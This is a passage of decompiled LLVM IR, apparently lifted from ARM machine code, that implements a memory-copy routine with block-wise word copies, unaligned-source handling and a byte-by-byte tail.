  %extract.t = trunc i32 %v0_11f90 to i2
  br i1 %v2_11fb0, label %dec_label_pc_11fb8, label %dec_label_pc_12084

dec_label_pc_11fb8:                               ; preds = %dec_label_pc_11fb0, %dec_label_pc_1207c
  %v0_11fd093 = phi i32 [ %v1_11f90, %dec_label_pc_11fb0 ], [ %v0_120cc76, %dec_label_pc_1207c ]
  %v0_11fcc92 = phi i32 [ %v0_11f90, %dec_label_pc_11fb0 ], [ %v0_1207c, %dec_label_pc_1207c ]
  %v0_11fb8 = phi i32 [ %v2_11fa0, %dec_label_pc_11fb0 ], [ %v2_12074, %dec_label_pc_1207c ]
  %v2_11fb8 = add i32 %v0_11fb8, -8
  store i32 %v2_11fb8, i32* %r2.global-to-local, align 4
  %v4_11fb8 = sub i32 7, %v0_11fb8
  %v5_11fb8 = and i32 %v4_11fb8, %v0_11fb8
  %v6_11fb8 = icmp slt i32 %v5_11fb8, 0
  store i1 %v6_11fb8, i1* %cpsr_v.global-to-local, align 1
  %v7_11fb8 = icmp slt i32 %v2_11fb8, 0
  store i1 %v7_11fb8, i1* %cpsr_n.global-to-local, align 1
  %v5_11fbc = icmp slt i32 %v0_11fb8, 8
  br i1 %v5_11fbc, label %dec_label_pc_1200c, label %dec_label_pc_11fc0

dec_label_pc_11fc0:                               ; preds = %dec_label_pc_11fb8
  %v2_11fc0 = add i32 %v0_11fb8, -28
  store i32 %v2_11fc0, i32* %r2.global-to-local, align 4
  %v4_11fc0 = sub i32 27, %v0_11fb8
  %v5_11fc0 = and i32 %v4_11fc0, %v2_11fb8
  %v6_11fc0 = icmp slt i32 %v5_11fc0, 0
  store i1 %v6_11fc0, i1* %cpsr_v.global-to-local, align 1
  %v7_11fc0 = icmp slt i32 %v2_11fc0, 0
  store i1 %v7_11fc0, i1* %cpsr_n.global-to-local, align 1
  %v5_11fc4 = icmp slt i32 %v2_11fb8, 20
  br i1 %v5_11fc4, label %dec_label_pc_11ff8, label %dec_label_pc_11fc8

dec_label_pc_11fc8:                               ; preds = %dec_label_pc_11fc0
  %v0_11fc8 = load i32, i32* @r4, align 4
  store i32 %v0_11fc8, i32* %stack_var_-12, align 4
  br label %dec_label_pc_11fcc

dec_label_pc_11fcc:                               ; preds = %dec_label_pc_11fcc.dec_label_pc_11fcc_crit_edge, %dec_label_pc_11fc8
  %v0_11fd0 = phi i32 [ %v12_11fd8, %dec_label_pc_11fcc.dec_label_pc_11fcc_crit_edge ], [ %v0_11fd093, %dec_label_pc_11fc8 ]
  %v0_11fcc = phi i32 [ %v0_11fcc.pre, %dec_label_pc_11fcc.dec_label_pc_11fcc_crit_edge ], [ %v0_11fcc92, %dec_label_pc_11fc8 ]
  %v1_11fcc = inttoptr i32 %v0_11fcc to i32*
  %v2_11fcc = load i32, i32* %v1_11fcc, align 4
  store i32 %v2_11fcc, i32* %r3.global-to-local, align 4
  %v3_11fcc = add i32 %v0_11fcc, 4
  %v4_11fcc = inttoptr i32 %v3_11fcc to i32*
  %v5_11fcc = load i32, i32* %v4_11fcc, align 4
  store i32 %v5_11fcc, i32* %r4.global-to-local, align 4
  %v6_11fcc = add i32 %v0_11fcc, 8
  %v7_11fcc = inttoptr i32 %v6_11fcc to i32*
  %v8_11fcc = load i32, i32* %v7_11fcc, align 4
  store i32 %v8_11fcc, i32* %ip.global-to-local, align 4
  %v9_11fcc = add i32 %v0_11fcc, 12
  %v10_11fcc = inttoptr i32 %v9_11fcc to i32*
  %v11_11fcc = load i32, i32* %v10_11fcc, align 4
  store i32 %v11_11fcc, i32* %lr.global-to-local, align 4
  %v12_11fcc = add i32 %v0_11fcc, 16
  store i32 %v12_11fcc, i32* %r1.global-to-local, align 4
  %v1_11fd0 = inttoptr i32 %v0_11fd0 to i32*
  store i32 %v2_11fcc, i32* %v1_11fd0, align 4
  %v3_11fd0 = add i32 %v0_11fd0, 4
  %v4_11fd0 = inttoptr i32 %v3_11fd0 to i32*
  %v5_11fd0 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_11fd0, i32* %v4_11fd0, align 4
  %v6_11fd0 = add i32 %v0_11fd0, 8
  %v7_11fd0 = inttoptr i32 %v6_11fd0 to i32*
  %v8_11fd0 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v8_11fd0, i32* %v7_11fd0, align 4
  %v9_11fd0 = add i32 %v0_11fd0, 12
  %v10_11fd0 = inttoptr i32 %v9_11fd0 to i32*
  %v11_11fd0 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v11_11fd0, i32* %v10_11fd0, align 4
  %v12_11fd0 = add i32 %v0_11fd0, 16
  store i32 %v12_11fd0, i32* %r0.global-to-local, align 4
  %v0_11fd4 = load i32, i32* %r1.global-to-local, align 4
  %v1_11fd4 = inttoptr i32 %v0_11fd4 to i32*
  %v2_11fd4 = load i32, i32* %v1_11fd4, align 4
  store i32 %v2_11fd4, i32* %r3.global-to-local, align 4
  %v3_11fd4 = add i32 %v0_11fd4, 4
  %v4_11fd4 = inttoptr i32 %v3_11fd4 to i32*
  %v5_11fd4 = load i32, i32* %v4_11fd4, align 4
  store i32 %v5_11fd4, i32* %r4.global-to-local, align 4
  %v6_11fd4 = add i32 %v0_11fd4, 8
  %v7_11fd4 = inttoptr i32 %v6_11fd4 to i32*
  %v8_11fd4 = load i32, i32* %v7_11fd4, align 4
  store i32 %v8_11fd4, i32* @ip, align 4
  %v9_11fd4 = add i32 %v0_11fd4, 12
  %v10_11fd4 = inttoptr i32 %v9_11fd4 to i32*
  %v11_11fd4 = load i32, i32* %v10_11fd4, align 4
  store i32 %v11_11fd4, i32* @lr, align 4
  %v12_11fd4 = add i32 %v0_11fd4, 16
  store i32 %v12_11fd4, i32* @r1, align 4
  %v1_11fd8 = inttoptr i32 %v12_11fd0 to i32*
  store i32 %v2_11fd4, i32* %v1_11fd8, align 4
  %v3_11fd8 = add i32 %v0_11fd0, 20
  %v4_11fd8 = inttoptr i32 %v3_11fd8 to i32*
  %v5_11fd8 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_11fd8, i32* %v4_11fd8, align 4
  %v6_11fd8 = add i32 %v0_11fd0, 24
  %v7_11fd8 = inttoptr i32 %v6_11fd8 to i32*
  %v8_11fd8 = load i32, i32* @ip, align 4
  store i32 %v8_11fd8, i32* %v7_11fd8, align 4
  %v9_11fd8 = add i32 %v0_11fd0, 28
  %v10_11fd8 = inttoptr i32 %v9_11fd8 to i32*
  %v11_11fd8 = load i32, i32* @lr, align 4
  store i32 %v11_11fd8, i32* %v10_11fd8, align 4
  %v12_11fd8 = add i32 %v0_11fd0, 32
  store i32 %v12_11fd8, i32* %r0.global-to-local, align 4
  %v0_11fdc = load i32, i32* %r2.global-to-local, align 4
  %v2_11fdc = add i32 %v0_11fdc, -32
  store i32 %v2_11fdc, i32* %r2.global-to-local, align 4
  %v6_11fe0 = icmp slt i32 %v0_11fdc, 32
  br i1 %v6_11fe0, label %dec_label_pc_11fe4, label %dec_label_pc_11fcc.dec_label_pc_11fcc_crit_edge

dec_label_pc_11fcc.dec_label_pc_11fcc_crit_edge:  ; preds = %dec_label_pc_11fcc
  %v0_11fcc.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_11fcc

dec_label_pc_11fe4:                               ; preds = %dec_label_pc_11fcc
  %v4_11fe4 = add i32 %v0_11fdc, -16
  %v6_11fe4 = add i32 %v0_11fdc, 2147483616
  %v7_11fe4 = and i32 %v4_11fe4, %v6_11fe4
  %v8_11fe4 = icmp slt i32 %v7_11fe4, 0
  store i1 %v8_11fe4, i1* %cpsr_v.global-to-local, align 1
  %v9_11fe4 = icmp slt i32 %v4_11fe4, 0
  store i1 %v9_11fe4, i1* %cpsr_n.global-to-local, align 1
  %v5_11fe8 = icmp slt i32 %v2_11fdc, -16
  br i1 %v5_11fe8, label %.thread2, label %bb130

bb130:                                            ; preds = %dec_label_pc_11fe4
  %v6_11fe8 = load i32, i32* @r1, align 4
  %v7_11fe8 = inttoptr i32 %v6_11fe8 to i32*
  %v8_11fe8 = load i32, i32* %v7_11fe8, align 4
  store i32 %v8_11fe8, i32* %r3.global-to-local, align 4
  %v9_11fe8 = add i32 %v6_11fe8, 4
  %v10_11fe8 = inttoptr i32 %v9_11fe8 to i32*
  %v11_11fe8 = load i32, i32* %v10_11fe8, align 4
  store i32 %v11_11fe8, i32* %r4.global-to-local, align 4
  %v12_11fe8 = add i32 %v6_11fe8, 8
  %v13_11fe8 = inttoptr i32 %v12_11fe8 to i32*
  %v14_11fe8 = load i32, i32* %v13_11fe8, align 4
  store i32 %v14_11fe8, i32* @ip, align 4
  %v15_11fe8 = add i32 %v6_11fe8, 12
  %v16_11fe8 = inttoptr i32 %v15_11fe8 to i32*
  %v17_11fe8 = load i32, i32* %v16_11fe8, align 4
  store i32 %v17_11fe8, i32* @lr, align 4
  %v18_11fe8 = add i32 %v6_11fe8, 16
  store i32 %v18_11fe8, i32* @r1, align 4
  %v7_11fec = inttoptr i32 %v12_11fd8 to i32*
  store i32 %v8_11fe8, i32* %v7_11fec, align 4
  %v9_11fec = add i32 %v0_11fd0, 36
  %v10_11fec = inttoptr i32 %v9_11fec to i32*
  %v11_11fec = load i32, i32* %r4.global-to-local, align 4
  store i32 %v11_11fec, i32* %v10_11fec, align 4
  %v12_11fec = add i32 %v0_11fd0, 40
  %v13_11fec = inttoptr i32 %v12_11fec to i32*
  %v14_11fec = load i32, i32* @ip, align 4
  store i32 %v14_11fec, i32* %v13_11fec, align 4
  %v15_11fec = add i32 %v0_11fd0, 44
  %v16_11fec = inttoptr i32 %v15_11fec to i32*
  %v17_11fec = load i32, i32* @lr, align 4
  store i32 %v17_11fec, i32* %v16_11fec, align 4
  %v18_11fec = add i32 %v0_11fd0, 48
  store i32 %v18_11fec, i32* %r0.global-to-local, align 4
  %v6_11ff0 = load i32, i32* %r2.global-to-local, align 4
  %v7_11ff0 = add i32 %v6_11ff0, -16
  store i32 %v7_11ff0, i32* %r2.global-to-local, align 4
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_11fe4, %bb130
  %v3_12000102 = phi i32 [ %v12_11fd8, %dec_label_pc_11fe4 ], [ %v18_11fec, %bb130 ]
  %v0_11ff896 = phi i32 [ %v2_11fdc, %dec_label_pc_11fe4 ], [ %v7_11ff0, %bb130 ]
  %v2_11ff4 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_11ff4, i32* @r4, align 4
  br label %dec_label_pc_11ff8

dec_label_pc_11ff8:                               ; preds = %dec_label_pc_11fc0, %.thread2
  %v3_12000101 = phi i32 [ %v0_11fd093, %dec_label_pc_11fc0 ], [ %v3_12000102, %.thread2 ]
  %v0_11ff8 = phi i32 [ %v2_11fc0, %dec_label_pc_11fc0 ], [ %v0_11ff896, %.thread2 ]
  %v1_11ff8 = add i32 %v0_11ff8, 20
  store i32 %v1_11ff8, i32* %r2.global-to-local, align 4
  %v3_11ff8 = sub i32 0, %v0_11ff8
  %v4_11ff8 = and i32 %v1_11ff8, %v3_11ff8
  %v5_11ff8 = icmp slt i32 %v4_11ff8, 0
  store i1 %v5_11ff8, i1* %cpsr_v.global-to-local, align 1
  %v6_11ff8 = icmp slt i32 %v1_11ff8, 0
  store i1 %v6_11ff8, i1* %cpsr_n.global-to-local, align 1
  br label %dec_label_pc_11ffc

dec_label_pc_11ffc:                               ; preds = %.thread118, %dec_label_pc_11ff8
  %v0_1200c.pre149 = phi i32 [ %v0_1200c.pre, %.thread118 ], [ %v1_11ff8, %dec_label_pc_11ff8 ]
  %v3_12000 = phi i32 [ %v3_1200099119, %.thread118 ], [ %v3_12000101, %dec_label_pc_11ff8 ]
  %v1_12004 = phi i1 [ %v1_12008, %.thread118 ], [ %v5_11ff8, %dec_label_pc_11ff8 ]
  %v0_12004 = phi i1 [ %v0_12008, %.thread118 ], [ %v6_11ff8, %dec_label_pc_11ff8 ]
  %v2_11ffc = xor i1 %v1_12004, %v0_12004
  br i1 %v2_11ffc, label %.thread118, label %bb131

bb131:                                            ; preds = %dec_label_pc_11ffc
  %v3_11ffc = load i32, i32* @r1, align 4
  %v4_11ffc = inttoptr i32 %v3_11ffc to i32*
  %v5_11ffc = load i32, i32* %v4_11ffc, align 4
  store i32 %v5_11ffc, i32* %r3.global-to-local, align 4
  %v6_11ffc = add i32 %v3_11ffc, 4
  %v7_11ffc = inttoptr i32 %v6_11ffc to i32*
  %v8_11ffc = load i32, i32* %v7_11ffc, align 4
  store i32 %v8_11ffc, i32* @ip, align 4
  %v9_11ffc = add i32 %v3_11ffc, 8
  %v10_11ffc = inttoptr i32 %v9_11ffc to i32*
  %v11_11ffc = load i32, i32* %v10_11ffc, align 4
  store i32 %v11_11ffc, i32* @lr, align 4
  %v12_11ffc = add i32 %v3_11ffc, 12
  store i32 %v12_11ffc, i32* @r1, align 4
  %v4_12000 = inttoptr i32 %v3_12000 to i32*
  store i32 %v5_11ffc, i32* %v4_12000, align 4
  %v6_12000 = add i32 %v3_12000, 4
  %v7_12000 = inttoptr i32 %v6_12000 to i32*
  %v8_12000 = load i32, i32* @ip, align 4
  store i32 %v8_12000, i32* %v7_12000, align 4
  %v9_12000 = add i32 %v3_12000, 8
  %v10_12000 = inttoptr i32 %v9_12000 to i32*
  %v11_12000 = load i32, i32* @lr, align 4
  store i32 %v11_12000, i32* %v10_12000, align 4
  %v12_12000 = add i32 %v3_12000, 12
  store i32 %v12_12000, i32* %r0.global-to-local, align 4
  %v3_12004 = load i32, i32* %r2.global-to-local, align 4
  %v4_12004 = add i32 %v3_12004, -12
  store i32 %v4_12004, i32* %r2.global-to-local, align 4
  %v6_12004 = sub i32 11, %v3_12004
  %v7_12004 = and i32 %v6_12004, %v3_12004
  %v8_12004 = icmp slt i32 %v7_12004, 0
  store i1 %v8_12004, i1* %cpsr_v.global-to-local, align 1
  %v9_12004 = icmp slt i32 %v4_12004, 0
  store i1 %v9_12004, i1* %cpsr_n.global-to-local, align 1
  br label %.thread118

.thread118:                                       ; preds = %dec_label_pc_11ffc, %bb131
  %v0_1200c.pre = phi i32 [ %v4_12004, %bb131 ], [ %v0_1200c.pre149, %dec_label_pc_11ffc ]
  %v3_1200099119 = phi i32 [ %v12_12000, %bb131 ], [ %v3_12000, %dec_label_pc_11ffc ]
  %v1_12008 = phi i1 [ %v8_12004, %bb131 ], [ %v1_12004, %dec_label_pc_11ffc ]
  %v0_12008 = phi i1 [ %v9_12004, %bb131 ], [ %v0_12004, %dec_label_pc_11ffc ]
  %v2_12008 = xor i1 %v1_12008, %v0_12008
  br i1 %v2_12008, label %dec_label_pc_1200c, label %dec_label_pc_11ffc

dec_label_pc_1200c:                               ; preds = %.thread118, %dec_label_pc_11fb8
  %v7_1201c = phi i32 [ %v0_11fd093, %dec_label_pc_11fb8 ], [ %v3_1200099119, %.thread118 ]
  %v0_1200c = phi i32 [ %v2_11fb8, %dec_label_pc_11fb8 ], [ %v0_1200c.pre, %.thread118 ]
  %v2_1200c = add i32 %v0_1200c, 8
  store i32 %v2_1200c, i32* %r2.global-to-local, align 4
  %v4_1200c = sub i32 0, %v0_1200c
  %v5_1200c = and i32 %v2_1200c, %v4_1200c
  %v6_1200c = icmp slt i32 %v5_1200c, 0
  store i1 %v6_1200c, i1* %cpsr_v.global-to-local, align 1
  %v7_1200c = icmp slt i32 %v2_1200c, 0
  store i1 %v7_1200c, i1* %cpsr_n.global-to-local, align 1
  %v5_12010 = icmp slt i32 %v0_1200c, -8
  br i1 %v5_12010, label %bb133, label %dec_label_pc_12014

dec_label_pc_12014:                               ; preds = %dec_label_pc_1200c
  %v6_12014 = add i32 %v0_1200c, 4
  store i32 %v6_12014, i32* %r2.global-to-local, align 4
  %v8_12014 = sub i32 -5, %v0_1200c
  %v9_12014 = and i32 %v8_12014, %v2_1200c
  %v10_12014 = icmp slt i32 %v9_12014, 0
  store i1 %v10_12014, i1* %cpsr_v.global-to-local, align 1
  %v11_12014 = icmp slt i32 %v6_12014, 0
  store i1 %v11_12014, i1* %cpsr_n.global-to-local, align 1
  %v5_12018 = icmp slt i32 %v2_1200c, 4
  %v6_12018 = load i32, i32* @r1, align 4
  %v7_12018 = inttoptr i32 %v6_12018 to i32*
  %v8_12018 = load i32, i32* %v7_12018, align 4
  store i32 %v8_12018, i32* %r3.global-to-local, align 4
  %v10_12018 = add i32 %v6_12018, 4
  br i1 %v5_12018, label %.thread6, label %bb132

.thread6:                                         ; preds = %dec_label_pc_12014
  store i32 %v10_12018, i32* @r1, align 4
  %v8_1201c = inttoptr i32 %v7_1201c to i32*
  store i32 %v8_12018, i32* %v8_1201c, align 4
  %v9_1201c = load i32, i32* %r0.global-to-local, align 4
  %v10_1201c = add i32 %v9_1201c, 4
  store i32 %v10_1201c, i32* %r0.global-to-local, align 4
  %v0_1202c.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb133

bb132:                                            ; preds = %dec_label_pc_12014
  %v10_12020 = inttoptr i32 %v10_12018 to i32*
  %v11_12020 = load i32, i32* %v10_12020, align 4
  store i32 %v11_12020, i32* @ip, align 4
  %v12_12020 = add i32 %v6_12018, 8
  store i32 %v12_12020, i32* @r1, align 4
  %v7_12024 = inttoptr i32 %v7_1201c to i32*
  store i32 %v8_12018, i32* %v7_12024, align 4
  %v9_12024 = add i32 %v7_1201c, 4
  %v10_12024 = inttoptr i32 %v9_12024 to i32*
  %v11_12024 = load i32, i32* @ip, align 4
  store i32 %v11_12024, i32* %v10_12024, align 4
  %v12_12024 = add i32 %v7_1201c, 8
  store i32 %v12_12024, i32* %r0.global-to-local, align 4
  %v6_12028 = load i32, i32* %r2.global-to-local, align 4
  %v7_12028 = add i32 %v6_12028, -4
  store i32 %v7_12028, i32* %r2.global-to-local, align 4
  br label %bb133

bb133:                                            ; preds = %.thread6, %.thread12, %dec_label_pc_1200c, %bb, %dec_label_pc_12168, %dec_label_pc_120fc, %dec_label_pc_121d4, %bb132
  %v2_1203c = phi i32 [ %v10_1201c, %.thread6 ], [ %v0_120cc76, %.thread12 ], [ %v7_1201c, %dec_label_pc_1200c ], [ %v1_11f90, %bb ], [ %v2_1203c114, %dec_label_pc_12168 ], [ %v2_1203c113, %dec_label_pc_120fc ], [ %v2_1203c112, %dec_label_pc_121d4 ], [ %v12_12024, %bb132 ]
  %v0_1202c = phi i32 [ %v0_1202c.pre, %.thread6 ], [ %v2_12074, %.thread12 ], [ %v2_1200c, %dec_label_pc_1200c ], [ %v2_11fa0, %bb ], [ %v0_1202c110, %dec_label_pc_12168 ], [ %v0_1202c109, %dec_label_pc_120fc ], [ %v0_1202c108, %dec_label_pc_121d4 ], [ %v7_12028, %bb132 ]
  %v1_1202c = add i32 %v0_1202c, 4
  store i32 %v1_1202c, i32* @r2, align 4
  %v3_1202c = sub i32 0, %v0_1202c
  %v4_1202c = and i32 %v1_1202c, %v3_1202c
  %v5_1202c = icmp slt i32 %v4_1202c, 0
  store i1 %v5_1202c, i1* %cpsr_v.global-to-local, align 1
  %v6_1202c = icmp slt i32 %v1_1202c, 0
  store i1 %v6_1202c, i1* %cpsr_n.global-to-local, align 1
  %v7_1202c = icmp eq i32 %v1_1202c, 0
  store i1 %v7_1202c, i1* @cpsr_z, align 1
  br i1 %v7_1202c, label %bb134, label %bb135

bb134:                                            ; preds = %bb133
  %v3_12030 = load i8*, i8** %stack_var_-8, align 4
  %v4_12030 = ptrtoint i8* %v3_12030 to i32
  store i32 %v4_12030, i32* %r0.global-to-local, align 4
  ret i32 %v4_12030

bb135:                                            ; preds = %bb133
  %v1_12034 = add i32 %v0_1202c, 2
  %v3_12034 = sub i32 -3, %v0_1202c
  %v4_12034 = and i32 %v3_12034, %v1_1202c
  %v5_12034 = icmp slt i32 %v4_12034, 0
  store i1 %v5_12034, i1* %cpsr_v.global-to-local, align 1
  %v6_12034 = icmp slt i32 %v1_12034, 0
  store i1 %v6_12034, i1* %cpsr_n.global-to-local, align 1
  %v7_12034 = icmp eq i32 %v1_1202c, 2
  store i1 %v7_12034, i1* @cpsr_z, align 1
  %v0_12038 = load i32, i32* @r1, align 4
  %v1_12038 = inttoptr i32 %v0_12038 to i8*
  %v2_12038 = load i8, i8* %v1_12038, align 1
  %v3_12038 = zext i8 %v2_12038 to i32
  store i32 %v3_12038, i32* %r3.global-to-local, align 4
  %v5_12038 = add i32 %v0_12038, 1
  store i32 %v5_12038, i32* @r1, align 4
  %v3_1203c = inttoptr i32 %v2_1203c to i8*
  store i8 %v2_12038, i8* %v3_1203c, align 1
  %v4_1203c = load i32, i32* %r0.global-to-local, align 4
  %v5_1203c = add i32 %v4_1203c, 1
  store i32 %v5_1203c, i32* %r0.global-to-local, align 4
  %v0_12040 = load i1, i1* %cpsr_n.global-to-local, align 1
  %v1_12040 = load i1, i1* %cpsr_v.global-to-local, align 1
  %v2_12040 = xor i1 %v0_12040, %v1_12040
  br i1 %v2_12040, label %.thread120, label %bb136

bb136:                                            ; preds = %bb135
  %v3_12040 = load i32, i32* @r1, align 4
  %v4_12040 = inttoptr i32 %v3_12040 to i8*
  %v5_12040 = load i8, i8* %v4_12040, align 1
  %v6_12040 = zext i8 %v5_12040 to i32
  store i32 %v6_12040, i32* %r3.global-to-local, align 4
  %v8_12040 = add i32 %v3_12040, 1
  store i32 %v8_12040, i32* @r1, align 4
  %v6_12044 = inttoptr i32 %v5_1203c to i8*
  store i8 %v5_12040, i8* %v6_12044, align 1
  %v7_12044 = load i32, i32* %r0.global-to-local, align 4
  %v8_12044 = add i32 %v7_12044, 1
  store i32 %v8_12044, i32* %r0.global-to-local, align 4
  %v1_12048.pre = load i1, i1* %cpsr_n.global-to-local, align 1
  %v2_12048.pre = load i1, i1* %cpsr_v.global-to-local, align 1
  br label %.thread120

.thread120:                                       ; preds = %bb135, %bb136
  %v7_1204c = phi i32 [ %v8_12044, %bb136 ], [ %v5_1203c, %bb135 ]
  %v2_1204c = phi i1 [ %v2_12048.pre, %bb136 ], [ %v1_12040, %bb135 ]
  %v1_1204c = phi i1 [ %v1_12048.pre, %bb136 ], [ %v0_12040, %bb135 ]
  %v0_12048 = load i1, i1* @cpsr_z, align 1
  %v3_12048 = xor i1 %v2_1204c, %v1_1204c
  %v4_12048 = or i1 %v0_12048, %v3_12048
  br i1 %v4_12048, label %.thread121, label %bb137

bb137:                                            ; preds = %.thread120
  %v5_12048 = load i32, i32* @r1, align 4
  %v6_12048 = inttoptr i32 %v5_12048 to i8*
  %v7_12048 = load i8, i8* %v6_12048, align 1
  %v8_12048 = zext i8 %v7_12048 to i32
  store i32 %v8_12048, i32* %r3.global-to-local, align 4
  %v10_12048 = add i32 %v5_12048, 1
  store i32 %v10_12048, i32* @r1, align 4
  %v8_1204c = inttoptr i32 %v7_1204c to i8*
  store i8 %v7_12048, i8* %v8_1204c, align 1
  %v9_1204c = load i32, i32* %r0.global-to-local, align 4
  %v10_1204c = add i32 %v9_1204c, 1
  store i32 %v10_1204c, i32* %r0.global-to-local, align 4
  br label %.thread121

.thread121:                                       ; preds = %.thread120, %bb137
  %v2_12050 = load i8*, i8** %stack_var_-8, align 4
  %v3_12050 = ptrtoint i8* %v2_12050 to i32
  store i32 %v3_12050, i32* %r0.global-to-local, align 4
  ret i32 %v3_12050

dec_label_pc_12054:                               ; preds = %dec_label_pc_11fa8
  %v1_12054 = sub nsw i32 4, %v1_11fa8
  store i32 %v1_12054, i32* @ip, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v8_12058 = icmp ult i32 %v1_12054, 2
  store i1 %v8_12058, i1* %cpsr_n.global-to-local, align 1
  %v1_1205c = inttoptr i32 %v0_11f90 to i8*
  %v2_1205c = load i8, i8* %v1_1205c, align 1
  %v3_1205c = zext i8 %v2_1205c to i32
  store i32 %v3_1205c, i32* %r3.global-to-local, align 4
  %v5_1205c = add i32 %v0_11f90, 1
  store i32 %v5_1205c, i32* @r1, align 4
  store i8 %v2_1205c, i8* %v5_11f9c, align 1
  %v4_12060 = load i32, i32* %r0.global-to-local, align 4
  %v5_12060 = add i32 %v4_12060, 1
  store i32 %v5_12060, i32* %r0.global-to-local, align 4
  br i1 %v8_12058, label %.thread12, label %bb138

bb138:                                            ; preds = %dec_label_pc_12054
  %v9_12058 = icmp eq i32 %v1_12054, 2
  %v6_12064 = load i32, i32* @r1, align 4
  %v7_12064 = inttoptr i32 %v6_12064 to i8*
  %v8_12064 = load i8, i8* %v7_12064, align 1
  %v9_12064 = zext i8 %v8_12064 to i32
  store i32 %v9_12064, i32* %r3.global-to-local, align 4
  %v11_12064 = add i32 %v6_12064, 1
  store i32 %v11_12064, i32* @r1, align 4
  %v9_12068 = inttoptr i32 %v5_12060 to i8*
  store i8 %v8_12064, i8* %v9_12068, align 1
  %v10_12068 = load i32, i32* %r0.global-to-local, align 4
  %v11_12068 = add i32 %v10_12068, 1
  store i32 %v11_12068, i32* %r0.global-to-local, align 4
  br i1 %v9_12058, label %.thread12, label %bb139

bb139:                                            ; preds = %bb138
  %v8_1206c = load i32, i32* @r1, align 4
  %v9_1206c = inttoptr i32 %v8_1206c to i8*
  %v10_1206c = load i8, i8* %v9_1206c, align 1
  %v11_1206c = zext i8 %v10_1206c to i32
  store i32 %v11_1206c, i32* %r3.global-to-local, align 4
  %v13_1206c = add i32 %v8_1206c, 1
  store i32 %v13_1206c, i32* @r1, align 4
  %v11_12070 = inttoptr i32 %v11_12068 to i8*
  store i8 %v10_1206c, i8* %v11_12070, align 1
  %v12_12070 = load i32, i32* %r0.global-to-local, align 4
  %v13_12070 = add i32 %v12_12070, 1
  store i32 %v13_12070, i32* %r0.global-to-local, align 4
  br label %.thread12

.thread12:                                        ; preds = %bb138, %dec_label_pc_12054, %bb139
  %v0_120cc76 = phi i32 [ %v11_12068, %bb138 ], [ %v5_12060, %dec_label_pc_12054 ], [ %v13_12070, %bb139 ]
  %v0_12074 = load i32, i32* %r2.global-to-local, align 4
  %v1_12074 = load i32, i32* @ip, align 4
  %v2_12074 = sub i32 %v0_12074, %v1_12074
  store i32 %v2_12074, i32* %r2.global-to-local, align 4
  %v4_12074 = xor i32 %v1_12074, %v0_12074
  %v5_12074 = xor i32 %v2_12074, %v0_12074
  %v6_12074 = and i32 %v5_12074, %v4_12074
  %v7_12074 = icmp slt i32 %v6_12074, 0
  store i1 %v7_12074, i1* %cpsr_v.global-to-local, align 1
  %v8_12074 = icmp slt i32 %v2_12074, 0
  store i1 %v8_12074, i1* %cpsr_n.global-to-local, align 1
  %v5_12078 = icmp slt i32 %v0_12074, %v1_12074
  br i1 %v5_12078, label %bb133, label %dec_label_pc_1207c

dec_label_pc_1207c:                               ; preds = %.thread12
  %v0_1207c = load i32, i32* @r1, align 4
  %v1_1207c = urem i32 %v0_1207c, 4
  store i32 %v1_1207c, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_1207c = icmp eq i32 %v1_1207c, 0
  %extract.t124 = trunc i32 %v0_1207c to i2
  br i1 %v2_1207c, label %dec_label_pc_11fb8, label %dec_label_pc_12084

dec_label_pc_12084:                               ; preds = %dec_label_pc_11fb0, %dec_label_pc_1207c
  %v0_120cc75 = phi i32 [ %v1_11f90, %dec_label_pc_11fb0 ], [ %v0_120cc76, %dec_label_pc_1207c ]
  %v0_12178 = phi i32 [ %v2_11fa0, %dec_label_pc_11fb0 ], [ %v2_12074, %dec_label_pc_1207c ]
  %v0_1208c.off0 = phi i2 [ %extract.t, %dec_label_pc_11fb0 ], [ %extract.t124, %dec_label_pc_1207c ]
  %v0_12084 = phi i32 [ %v0_11f90, %dec_label_pc_11fb0 ], [ %v0_1207c, %dec_label_pc_1207c ]
  %v1_12084 = and i32 %v0_12084, -4
  store i32 %v1_12084, i32* %r1.global-to-local, align 4
  %v1_12088 = inttoptr i32 %v1_12084 to i32*
  %v2_12088 = load i32, i32* %v1_12088, align 4
  store i32 %v2_12088, i32* @lr, align 4
  %v4_12088 = add i32 %v1_12084, 4
  store i32 %v4_12088, i32* %r1.global-to-local, align 4
  %v2_12170 = add i32 %v0_12178, -12
  %v4_12170 = sub i32 11, %v0_12178
  %v5_12170 = and i32 %v4_12170, %v0_12178
  %v6_12170 = icmp slt i32 %v5_12170, 0
  store i1 %v6_12170, i1* %cpsr_v.global-to-local, align 1
  %v7_12170 = icmp slt i32 %v2_12170, 0
  store i1 %v7_12170, i1* %cpsr_n.global-to-local, align 1
  %v5_12174 = icmp slt i32 %v0_12178, 12
  switch i2 %v0_1208c.off0, label %dec_label_pc_12098 [
    i2 -1, label %dec_label_pc_12170
    i2 -2, label %dec_label_pc_12104
  ]

dec_label_pc_12098:                               ; preds = %dec_label_pc_12084
  br i1 %v5_12174, label %dec_label_pc_120e4, label %dec_label_pc_120a0

dec_label_pc_120a0:                               ; preds = %dec_label_pc_12098
  store i32 %v2_12170, i32* %r2.global-to-local, align 4
  %v3_120a4 = load i32, i32* @r4, align 4
  store i32 %v3_120a4, i32* %stack_var_-16, align 4
  %v6_120a4 = load i32, i32* @r5, align 4
  store i32 %v6_120a4, i32* %stack_var_-12, align 4
  br label %dec_label_pc_120a8

dec_label_pc_120a8:                               ; preds = %dec_label_pc_120a8.dec_label_pc_120a8_crit_edge, %dec_label_pc_120a0
  %v0_120cc = phi i32 [ %v12_120cc, %dec_label_pc_120a8.dec_label_pc_120a8_crit_edge ], [ %v0_120cc75, %dec_label_pc_120a0 ]
  %v0_120ac = phi i32 [ %v0_120ac.pre, %dec_label_pc_120a8.dec_label_pc_120a8_crit_edge ], [ %v4_12088, %dec_label_pc_120a0 ]
  %v0_120a8 = phi i32 [ %v0_120a8.pre, %dec_label_pc_120a8.dec_label_pc_120a8_crit_edge ], [ %v2_12088, %dec_label_pc_120a0 ]
  %v3_120a8 = udiv i32 %v0_120a8, 256
